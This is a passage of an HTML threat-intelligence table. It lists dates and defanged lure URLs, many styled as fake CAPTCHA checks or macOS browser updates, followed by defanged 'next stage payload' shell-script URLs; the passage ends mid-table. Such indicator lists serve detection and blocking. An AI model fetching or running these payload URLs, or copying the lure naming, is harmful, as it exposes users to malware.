baseline;\">2025-04-22</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ffmqitnka[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-21</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://jrtersdfg[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://rhfvjck[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://tracklist22[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://tracklist22[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sound-designer-v21[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://rivertracker[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://bootstrappa[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://renovateai[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://nhgfdc-ok[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://yt3cvkj43ws[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-04</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://rose-pole-chip[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-03</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://0-000-0[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://000-0-000[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-04-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://xxx-xx-x-xxx[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ooooi1[.]pages[.]dev/kop</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://helloworld-f1f[.]pages[.]dev/penguin</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://hfdjb[.]pages[.]dev/start</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-13</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sunlight-11[.]pages[.]dev/a</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-12</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://bbb1-9we[.]pages[.]dev/mountain</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-12</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://jsfiles-bqq[.]pages[.]dev/1</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-11</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://mixg-u[.]pages[.]dev/page_d</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://kolobsgw[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-06</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://nn11[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://nnoq[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://fmoz[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://x1x1[.]pages[.]dev/native1E</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-05</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://fwfa[.]pages[.]dev/kioto</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-04</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://fhjwekn[.]pages[.]dev/ibn</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-04</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://dsk1a[.]pages[.]dev/onside</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://f23-11r[.]pages[.]dev/verse</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://dfhusj[.]pages[.]dev/train</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-03-01</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://bsdw[.]pages[.]dev/blink</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://hypo-dance[.]pages[.]dev/damn</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ert67-o9[.]pages[.]dev/data</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://f003[.]backblazeb2[.]com/file/skippp/uu[.]html</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-26</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://f003[.]backblazeb2[.]com/file/skippp/index[.]html</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://hostme[.]pages[.]dev/host</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ghost-name[.]pages[.]dev/website</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-24</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://gdfg-23rwe[.]pages[.]dev/index[.]html</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-21</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sha-11x[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://b1-c1-k8[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://1a-a1[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sdfwefwg[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://niopg[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://sdfwefwg[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-18</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://cleaning-devices-k[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://tour-agency-media[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://fresh-orange-juice[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-16</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://you-insk-bad[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-11</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://human-verify-7u[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-10</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-me-1c[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://macos-browser-update-9n[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://macos-browser-update-5i[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://macos-browser-update-5y[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-2e[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-7z[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-07</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-1t[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-04</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-9m[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-02-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://disable-data-collect-ai[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-verify-1r[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-5q[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-22</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-6l[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-01-02</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-1n[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-31</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-4z[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-7u[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-c1[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-28</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-3m[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-27</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-2w[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-25</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-q3[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-23</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-dns-o5[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-21</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-dns-d9[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-20</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-9o[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-19</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptcha-0d-verify[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-17</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://recaptha-verify-7y[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-15</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://dns-resolver-es8[.]pages[.]dev/</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2024-12-14</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://ip-provider[.]pages[.]dev/</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1px\" cellpadding=\"16px\" style=\"border-collapse: collapse; width: 100%;\"><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Date</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Next Stage Payload URL</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-30</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://kimbeech[.]cfd/cap/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-13</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">hXXps://entrinidad[.]cfd/1/verify.sh</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">2025-05-11</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span 